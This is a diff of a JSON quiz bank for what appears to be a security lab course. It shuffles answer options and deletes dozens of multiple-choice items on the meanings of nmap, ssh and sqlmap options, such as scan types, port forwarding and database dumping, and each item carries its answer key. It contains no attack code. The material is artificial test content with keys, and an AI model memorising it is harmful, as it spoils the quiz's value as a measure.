       "B": "XMAS scan (FIN/PSH/URG)",
-      "C": "SYN scan (default when root)",
+      "C": "Idle/Zombie scan",
       "D": "Host discovery only (no port scan)"
     },
     "correct": [
-      "C"
+      "A"
     ],
     "explanation": "Variant question (same fact) for rotation practice."
   },
@@ -2157,13 +2149,13 @@
     "multi": false,
     "question": "Choose the correct meaning of nmap option `-sT`:",
     "options": {
-      "A": "TCP connect scan (used for pivoting/proxy)",
-      "B": "ICMP timestamp request discovery",
-      "C": "Idle/Zombie scan",
-      "D": "OS detection"
+      "A": "ICMP timestamp request discovery",
+      "B": "Idle/Zombie scan",
+      "C": "OS detection",
+      "D": "TCP connect scan (used for pivoting/proxy)"
     },
     "correct": [
-      "A"
+      "D"
     ],
     "explanation": "Variant question (same fact) for rotation practice."
   },
@@ -2173,13 +2165,13 @@
     "multi": false,
     "question": "Choose the correct meaning of nmap option `-sX`:",
     "options": {
-      "A": "XMAS scan (FIN/PSH/URG)",
-      "B": "SYN scan (default when root)",
+      "A": "SYN scan (default when root)",
+      "B": "Idle/Zombie scan",
       "C": "Service version detection",
-      "D": "Idle/Zombie scan"
+      "D": "XMAS scan (FIN/PSH/URG)"
     },
     "correct": [
-      "A"
+      "D"
     ],
     "explanation": "Variant question (same fact) for rotation practice."
   },
@@ -2190,9 +2182,9 @@
     "question": "Choose the correct meaning of nmap option `-sV`:",
     "options": {
       "A": "Service version detection",
-      "B": "SYN scan (default when root)",
+      "B": "Idle/Zombie scan",
       "C": "No DNS resolution",
-      "D": "Idle/Zombie scan"
+      "D": "SYN scan (default when root)"
     },
     "correct": [
       "A"
@@ -2206,9 +2198,9 @@
     "question": "Choose the correct meaning of nmap option `-O`:",
     "options": {
       "A": "SYN scan (default when root)",
-      "B": "Host discovery only (no port scan)",
+      "B": "ICMP timestamp request discovery",
       "C": "OS detection",
-      "D": "ICMP timestamp request discovery"
+      "D": "Host discovery only (no port scan)"
     },
     "correct": [
       "C"
@@ -2222,12 +2214,12 @@
     "question": "Choose the correct meaning of nmap option `-A`:",
     "options": {
       "A": "No DNS resolution",
-      "B": "OS detection",
-      "C": "Aggressive (-sV, -O, scripts, traceroute)",
-      "D": "SYN scan (default when root)"
+      "B": "Aggressive (-sV, -O, scripts, traceroute)",
+      "C": "SYN scan (default when root)",
+      "D": "OS detection"
     },
     "correct": [
-      "C"
+      "B"
     ],
     "explanation": "Variant question (same fact) for rotation practice."
   },
@@ -2254,8 +2246,8 @@
     "question": "Choose the correct meaning of nmap option `-Pn`:",
     "options": {
       "A": "Treat host as up (skip ping)",
-      "B": "TCP connect scan (used for pivoting/proxy)",
-      "C": "No DNS resolution",
+      "B": "No DNS resolution",
+      "C": "TCP connect scan (used for pivoting/proxy)",
       "D": "Service version detection"
     },
     "correct": [
@@ -2269,13 +2261,13 @@
     "multi": false,
     "question": "Choose the correct meaning of ssh option `-f`:",
     "options": {
-      "A": "Fork to background after auth (run in background)",
+      "A": "Disable pseudo-TTY allocation",
       "B": "Remote port forwarding",
-      "C": "Disable pseudo-TTY allocation",
+      "C": "Fork to background after auth (run in background)",
       "D": "Do not execute remote command (tunnel only)"
     },
     "correct": [
-      "A"
+      "C"
     ],
     "explanation": "Variant question (same fact) for rotation practice."
   },
@@ -2285,13 +2277,13 @@
     "multi": false,
     "question": "Choose the correct meaning of ssh option `-N`:",
     "options": {
-      "A": "Dynamic port forwarding (SOCKS proxy)",
-      "B": "Disable pseudo-TTY allocation",
-      "C": "Do not execute remote command (tunnel only)",
-      "D": "Fork to background after auth (run in background)"
+      "A": "Do not execute remote command (tunnel only)",
+      "B": "Fork to background after auth (run in background)",
+      "C": "Dynamic port forwarding (SOCKS proxy)",
+      "D": "Disable pseudo-TTY allocation"
     },
     "correct": [
-      "C"
+      "A"
     ],
     "explanation": "Variant question (same fact) for rotation practice."
   },
@@ -2301,10 +2293,10 @@
     "multi": false,
     "question": "Choose the correct meaning of ssh option `-T`:",
     "options": {
-      "A": "Remote port forwarding",
-      "B": "Local port forwarding",
+      "A": "Local port forwarding",
+      "B": "Fork to background after auth (run in background)",
       "C": "Disable pseudo-TTY allocation",
-      "D": "Fork to background after auth (run in background)"
+      "D": "Remote port forwarding"
     },
     "correct": [
       "C"
@@ -2317,13 +2309,13 @@
     "multi": false,
     "question": "Choose the correct meaning of ssh option `-R`:",
     "options": {
-      "A": "Do not execute remote command (tunnel only)",
-      "B": "Remote port forwarding",
-      "C": "Disable pseudo-TTY allocation",
-      "D": "Local port forwarding"
+      "A": "Disable pseudo-TTY allocation",
+      "B": "Local port forwarding",
+      "C": "Remote port forwarding",
+      "D": "Do not execute remote command (tunnel only)"
     },
     "correct": [
-      "B"
+      "C"
     ],
     "explanation": "Variant question (same fact) for rotation practice."
   },
@@ -2333,13 +2325,13 @@
     "multi": false,
     "question": "Choose the correct meaning of ssh option `-L`:",
     "options": {
-      "A": "Local port forwarding",
+      "A": "Remote port forwarding",
       "B": "Do not execute remote command (tunnel only)",
-      "C": "Remote port forwarding",
+      "C": "Local port forwarding",
       "D": "Disable pseudo-TTY allocation"
     },
     "correct": [
-      "A"
+      "C"
     ],
     "explanation": "Variant question (same fact) for rotation practice."
   },
@@ -2349,13 +2341,13 @@
     "multi": false,
     "question": "Choose the correct meaning of ssh option `-D`:",
     "options": {
-      "A": "Do not execute remote command (tunnel only)",
-      "B": "Disable pseudo-TTY allocation",
-      "C": "Dynamic port forwarding (SOCKS proxy)",
-      "D": "Fork to background after auth (run in background)"
+      "A": "Dynamic port forwarding (SOCKS proxy)",
+      "B": "Fork to background after auth (run in background)",
+      "C": "Do not execute remote command (tunnel only)",
+      "D": "Disable pseudo-TTY allocation"
     },
     "correct": [
-      "C"
+      "A"
     ],
     "explanation": "Variant question (same fact) for rotation practice."
   },
@@ -2366,8 +2358,8 @@
     "question": "Choose the correct meaning of sqlmap option `--dbs`:",
     "options": {
       "A": "List database names",
-      "B": "Send session cookies",
-      "C": "List tables for a DB (requires -D)",
+      "B": "List tables for a DB (requires -D)",
+      "C": "Send session cookies",
       "D": "Retrieve current DB user"
     },
     "correct": [
@@ -2381,13 +2373,13 @@
     "multi": false,
     "question": "Choose the correct meaning of sqlmap option `--dump`:",
     "options": {
-      "A": "List tables for a DB (requires -D)",
-      "B": "Dump table data",
-      "C": "Force HTTP method to POST",
-      "D": "Set HTTP referer header"
+      "A": "Dump table data",
+      "B": "List tables for a DB (requires -D)",
+      "C": "Set HTTP referer header",
+      "D": "Force HTTP method to POST"
     },
     "correct": [
-      "B"
+      "A"
     ],
     "explanation": "Variant question (same fact) for rotation practice."
   },
@@ -2397,2410 +2389,10 @@
     "multi": false,
     "question": "Choose the correct meaning of sqlmap option `--current-user`:",
     "options": {
-      "A": "List tables for a DB (requires -D)",
-      "B": "Retrieve current DB user",
-      "C": "List database names",
-      "D": "Check if current user is DBA"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 151,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--is-dba`:",
-    "options": {
-      "A": "Check if current user is DBA",
-      "B": "Force HTTP method to POST",
-      "C": "List tables for a DB (requires -D)",
-      "D": "List database names"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 152,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--tables`:",
-    "options": {
-      "A": "List tables for a DB (requires -D)",
-      "B": "Set HTTP referer header",
-      "C": "List columns for a table (requires -D and -T)",
-      "D": "Send parameters in the request body"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 153,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--columns`:",
-    "options": {
       "A": "Retrieve current DB user",
-      "B": "List columns for a table (requires -D and -T)",
-      "C": "Set HTTP referer header",
-      "D": "Dump table data"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 154,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--method=POST`:",
-    "options": {
-      "A": "Send session cookies",
-      "B": "Force HTTP method to POST",
-      "C": "List database names",
-      "D": "Send parameters in the request body"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 155,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--data`:",
-    "options": {
-      "A": "Dump table data",
-      "B": "List database names",
-      "C": "Check if current user is DBA",
-      "D": "Send parameters in the request body"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 156,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--cookie`:",
-    "options": {
-      "A": "Retrieve current DB user",
-      "B": "Send session cookies",
-      "C": "List tables for a DB (requires -D)",
-      "D": "List database names"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 157,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--referer`:",
-    "options": {
-      "A": "Set HTTP referer header",
-      "B": "Dump table data",
-      "C": "List database names",
-      "D": "Check if current user is DBA"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 158,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sn`:",
-    "options": {
-      "A": "TCP connect scan (used for pivoting/proxy)",
-      "B": "Host discovery only (no port scan)",
-      "C": "XMAS scan (FIN/PSH/URG)",
-      "D": "Service version detection"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 159,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-n`:",
-    "options": {
-      "A": "SYN scan (default when root)",
-      "B": "XMAS scan (FIN/PSH/URG)",
-      "C": "No DNS resolution",
-      "D": "Service version detection"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 160,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-PP`:",
-    "options": {
-      "A": "SYN scan (default when root)",
-      "B": "ICMP timestamp request discovery",
-      "C": "Idle/Zombie scan",
-      "D": "Host discovery only (no port scan)"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 161,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sS`:",
-    "options": {
-      "A": "XMAS scan (FIN/PSH/URG)",
-      "B": "SYN scan (default when root)",
-      "C": "Idle/Zombie scan",
-      "D": "Host discovery only (no port scan)"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 162,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sT`:",
-    "options": {
-      "A": "Idle/Zombie scan",
-      "B": "Host discovery only (no port scan)",
-      "C": "OS detection",
-      "D": "TCP connect scan (used for pivoting/proxy)"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 163,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sX`:",
-    "options": {
-      "A": "XMAS scan (FIN/PSH/URG)",
-      "B": "Service version detection",
-      "C": "Host discovery only (no port scan)",
-      "D": "TCP connect scan (used for pivoting/proxy)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 164,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sV`:",
-    "options": {
-      "A": "SYN scan (default when root)",
-      "B": "OS detection",
-      "C": "Service version detection",
-      "D": "No DNS resolution"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 165,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-O`:",
-    "options": {
-      "A": "TCP connect scan (used for pivoting/proxy)",
-      "B": "Idle/Zombie scan",
-      "C": "ICMP timestamp request discovery",
-      "D": "OS detection"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 166,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-A`:",
-    "options": {
-      "A": "No DNS resolution",
-      "B": "Aggressive (-sV, -O, scripts, traceroute)",
-      "C": "Host discovery only (no port scan)",
-      "D": "OS detection"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 167,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sI`:",
-    "options": {
-      "A": "Aggressive (-sV, -O, scripts, traceroute)",
-      "B": "Idle/Zombie scan",
-      "C": "ICMP timestamp request discovery",
-      "D": "TCP connect scan (used for pivoting/proxy)"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 168,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-Pn`:",
-    "options": {
-      "A": "ICMP timestamp request discovery",
-      "B": "Treat host as up (skip ping)",
-      "C": "SYN scan (default when root)",
-      "D": "Service version detection"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 169,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-f`:",
-    "options": {
-      "A": "Dynamic port forwarding (SOCKS proxy)",
-      "B": "Local port forwarding",
-      "C": "Fork to background after auth (run in background)",
-      "D": "Do not execute remote command (tunnel only)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 170,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-N`:",
-    "options": {
-      "A": "Disable pseudo-TTY allocation",
-      "B": "Do not execute remote command (tunnel only)",
-      "C": "Fork to background after auth (run in background)",
-      "D": "Local port forwarding"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 171,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-T`:",
-    "options": {
-      "A": "Disable pseudo-TTY allocation",
-      "B": "Remote port forwarding",
-      "C": "Dynamic port forwarding (SOCKS proxy)",
-      "D": "Fork to background after auth (run in background)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 172,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-R`:",
-    "options": {
-      "A": "Dynamic port forwarding (SOCKS proxy)",
-      "B": "Disable pseudo-TTY allocation",
-      "C": "Remote port forwarding",
-      "D": "Do not execute remote command (tunnel only)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 173,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-L`:",
-    "options": {
-      "A": "Local port forwarding",
-      "B": "Dynamic port forwarding (SOCKS proxy)",
-      "C": "Disable pseudo-TTY allocation",
-      "D": "Fork to background after auth (run in background)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 174,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-D`:",
-    "options": {
-      "A": "Do not execute remote command (tunnel only)",
-      "B": "Dynamic port forwarding (SOCKS proxy)",
-      "C": "Local port forwarding",
-      "D": "Fork to background after auth (run in background)"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 175,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--dbs`:",
-    "options": {
-      "A": "List columns for a table (requires -D and -T)",
-      "B": "Send parameters in the request body",
-      "C": "List database names",
-      "D": "List tables for a DB (requires -D)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 176,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--dump`:",
-    "options": {
-      "A": "List columns for a table (requires -D and -T)",
-      "B": "Dump table data",
-      "C": "Set HTTP referer header",
-      "D": "Send parameters in the request body"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 177,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--current-user`:",
-    "options": {
-      "A": "Send parameters in the request body",
-      "B": "Retrieve current DB user",
-      "C": "List columns for a table (requires -D and -T)",
-      "D": "Set HTTP referer header"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 178,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--is-dba`:",
-    "options": {
-      "A": "List tables for a DB (requires -D)",
-      "B": "List columns for a table (requires -D and -T)",
-      "C": "Check if current user is DBA",
-      "D": "Dump table data"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 179,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--tables`:",
-    "options": {
-      "A": "Set HTTP referer header",
-      "B": "Check if current user is DBA",
-      "C": "List tables for a DB (requires -D)",
-      "D": "Force HTTP method to POST"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 180,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--columns`:",
-    "options": {
-      "A": "List database names",
       "B": "List tables for a DB (requires -D)",
-      "C": "Send parameters in the request body",
-      "D": "List columns for a table (requires -D and -T)"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 181,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--method=POST`:",
-    "options": {
-      "A": "Send session cookies",
-      "B": "Dump table data",
-      "C": "Force HTTP method to POST",
-      "D": "List tables for a DB (requires -D)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 182,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--data`:",
-    "options": {
-      "A": "Retrieve current DB user",
-      "B": "Send parameters in the request body",
-      "C": "Force HTTP method to POST",
-      "D": "Dump table data"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 183,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--cookie`:",
-    "options": {
-      "A": "List columns for a table (requires -D and -T)",
-      "B": "Check if current user is DBA",
-      "C": "Dump table data",
-      "D": "Send session cookies"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 184,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--referer`:",
-    "options": {
-      "A": "Retrieve current DB user",
-      "B": "List database names",
-      "C": "Set HTTP referer header",
-      "D": "Check if current user is DBA"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 185,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sn`:",
-    "options": {
-      "A": "Treat host as up (skip ping)",
-      "B": "SYN scan (default when root)",
-      "C": "Host discovery only (no port scan)",
-      "D": "XMAS scan (FIN/PSH/URG)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 186,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-n`:",
-    "options": {
-      "A": "Host discovery only (no port scan)",
-      "B": "Idle/Zombie scan",
-      "C": "XMAS scan (FIN/PSH/URG)",
-      "D": "No DNS resolution"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 187,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-PP`:",
-    "options": {
-      "A": "ICMP timestamp request discovery",
-      "B": "Aggressive (-sV, -O, scripts, traceroute)",
-      "C": "OS detection",
-      "D": "TCP connect scan (used for pivoting/proxy)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 188,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sS`:",
-    "options": {
-      "A": "Idle/Zombie scan",
-      "B": "No DNS resolution",
-      "C": "SYN scan (default when root)",
-      "D": "Service version detection"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 189,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sT`:",
-    "options": {
-      "A": "TCP connect scan (used for pivoting/proxy)",
-      "B": "Host discovery only (no port scan)",
-      "C": "Idle/Zombie scan",
-      "D": "Aggressive (-sV, -O, scripts, traceroute)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 190,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sX`:",
-    "options": {
-      "A": "XMAS scan (FIN/PSH/URG)",
-      "B": "OS detection",
-      "C": "Host discovery only (no port scan)",
-      "D": "TCP connect scan (used for pivoting/proxy)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 191,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sV`:",
-    "options": {
-      "A": "TCP connect scan (used for pivoting/proxy)",
-      "B": "XMAS scan (FIN/PSH/URG)",
-      "C": "Service version detection",
-      "D": "Host discovery only (no port scan)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 192,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-O`:",
-    "options": {
-      "A": "No DNS resolution",
-      "B": "SYN scan (default when root)",
-      "C": "OS detection",
-      "D": "Aggressive (-sV, -O, scripts, traceroute)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 193,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-A`:",
-    "options": {
-      "A": "XMAS scan (FIN/PSH/URG)",
-      "B": "Aggressive (-sV, -O, scripts, traceroute)",
-      "C": "SYN scan (default when root)",
-      "D": "Treat host as up (skip ping)"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 194,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-sI`:",
-    "options": {
-      "A": "SYN scan (default when root)",
-      "B": "XMAS scan (FIN/PSH/URG)",
-      "C": "OS detection",
-      "D": "Idle/Zombie scan"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 195,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of nmap option `-Pn`:",
-    "options": {
-      "A": "OS detection",
-      "B": "TCP connect scan (used for pivoting/proxy)",
-      "C": "Treat host as up (skip ping)",
-      "D": "Host discovery only (no port scan)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 196,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-f`:",
-    "options": {
-      "A": "Fork to background after auth (run in background)",
-      "B": "Dynamic port forwarding (SOCKS proxy)",
-      "C": "Remote port forwarding",
-      "D": "Disable pseudo-TTY allocation"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 197,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-N`:",
-    "options": {
-      "A": "Do not execute remote command (tunnel only)",
-      "B": "Fork to background after auth (run in background)",
-      "C": "Remote port forwarding",
-      "D": "Dynamic port forwarding (SOCKS proxy)"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 198,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-T`:",
-    "options": {
-      "A": "Fork to background after auth (run in background)",
-      "B": "Dynamic port forwarding (SOCKS proxy)",
-      "C": "Do not execute remote command (tunnel only)",
-      "D": "Disable pseudo-TTY allocation"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 199,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-R`:",
-    "options": {
-      "A": "Do not execute remote command (tunnel only)",
-      "B": "Remote port forwarding",
-      "C": "Dynamic port forwarding (SOCKS proxy)",
-      "D": "Local port forwarding"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 200,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-L`:",
-    "options": {
-      "A": "Dynamic port forwarding (SOCKS proxy)",
-      "B": "Disable pseudo-TTY allocation",
-      "C": "Local port forwarding",
-      "D": "Fork to background after auth (run in background)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 201,
-    "topic": "LabGuide",
-    "multi": false,
-    "question": "Choose the correct meaning of ssh option `-D`:",
-    "options": {
-      "A": "Remote port forwarding",
-      "B": "Do not execute remote command (tunnel only)",
-      "C": "Dynamic port forwarding (SOCKS proxy)",
-      "D": "Fork to background after auth (run in background)"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 202,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--dbs`:",
-    "options": {
-      "A": "Set HTTP referer header",
-      "B": "List database names",
-      "C": "Check if current user is DBA",
-      "D": "Retrieve current DB user"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 203,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--dump`:",
-    "options": {
-      "A": "Retrieve current DB user",
-      "B": "List columns for a table (requires -D and -T)",
-      "C": "Set HTTP referer header",
-      "D": "Dump table data"
-    },
-    "correct": [
-      "D"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 204,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--current-user`:",
-    "options": {
-      "A": "List tables for a DB (requires -D)",
-      "B": "Retrieve current DB user",
-      "C": "Send parameters in the request body",
-      "D": "List database names"
-    },
-    "correct": [
-      "B"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 205,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--is-dba`:",
-    "options": {
-      "A": "List tables for a DB (requires -D)",
-      "B": "Set HTTP referer header",
-      "C": "Check if current user is DBA",
-      "D": "Send parameters in the request body"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 206,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--tables`:",
-    "options": {
-      "A": "List tables for a DB (requires -D)",
-      "B": "Set HTTP referer header",
-      "C": "Dump table data",
-      "D": "List database names"
-    },
-    "correct": [
-      "A"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 207,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--columns`:",
-    "options": {
-      "A": "List database names",
-      "B": "Retrieve current DB user",
-      "C": "List columns for a table (requires -D and -T)",
-      "D": "Force HTTP method to POST"
-    },
-    "correct": [
-      "C"
-    ],
-    "explanation": "Variant question (same fact) for rotation practice."
-  },
-  {
-    "id": 208,
-    "topic": "Lab3",
-    "multi": false,
-    "question": "Choose the correct meaning of sqlmap option `--method=POST`:",
-    "options": {
-      "A": "Dump table data",
-      "B": "Retrieve current DB user",
